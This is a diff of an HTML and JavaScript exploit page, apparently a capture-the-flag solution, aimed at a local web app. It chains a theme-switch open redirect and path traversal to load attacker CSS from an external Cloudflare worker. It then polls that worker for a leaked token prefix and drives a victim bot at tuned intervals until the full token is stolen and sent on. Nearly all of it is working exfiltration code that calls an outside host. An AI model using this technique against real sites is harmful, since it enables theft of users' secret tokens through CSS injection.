@@ -9,9 +9,12 @@
 <pre id="log">starting...</pre>
 
 <script>
-const WORKER_BASE = "https://flat-unit-aed6.xxterenerertxx.workers.dev/";
+const WORKER_BASE = "https://flat-unit-aed6.xxterenerertxx.workers.dev";
 const TARGET_ORIGIN = "http://localhost:5000";
-const TARGET_USER_ID = "0331f605-be5c-485a-bd56-ca41a0871451";
+const TARGET_USER_ID = "95508c88-6b7f-4d85-a253-b01f3eb1c4ed";
+
+// 每次 report 都換一個新的 id
+const id = "run001";
 
 const logEl = document.getElementById("log");
 function log(...xs) {
@@ -20,16 +23,8 @@ function log(...xs) {
   logEl.textContent += "\n" + s;
 }
 
-const id = "test123";
 const workerHost = new URL(WORKER_BASE).host;
 
-/*
-  layout.html:
-    <link rel="stylesheet" href="/static/css/{{theme}}.css">
-
-  所以 theme 要設成：
-    ../../switch_theme?theme=light&redirect_path=//WORKER/css/ID
-*/
 const innerTheme =
   `../../switch_theme?theme=light&redirect_path=//${workerHost}/css/${id}`;
 
@@ -90,7 +85,7 @@ function sendFinal(token) {
 async function poll() {
   try {
     const st = await getState();
-    log(`[i] prefix_len=${(st.prefix || "").length} done=${st.done}`);
+    log(`[i] prefix="${st.prefix || ""}" len=${(st.prefix || "").length} done=${st.done}`);
 
     if (st.done && st.token) {
       sendFinal(st.token);
@@ -103,13 +98,13 @@ async function poll() {
 log("[*] id =", id);
 log("[*] victimUrl =", victimUrl);
 
-// 先開一次
+// 先打一次
 navVictim();
+poll();
 
-// 這裡不要太慢，也不要太快
-// 2-char/round 後，60~80ms 通常比上一版 35ms 更穩
-navTimer = setInterval(navVictim, 10000);
-pollTimer = setInterval(poll, 10000);
+// 1-char slim worker 比較適合放慢一點，但不能慢到超過 bot 停留時間
+navTimer = setInterval(navVictim, 800);
+pollTimer = setInterval(poll, 150);
 </script>
 </body>
 </html>
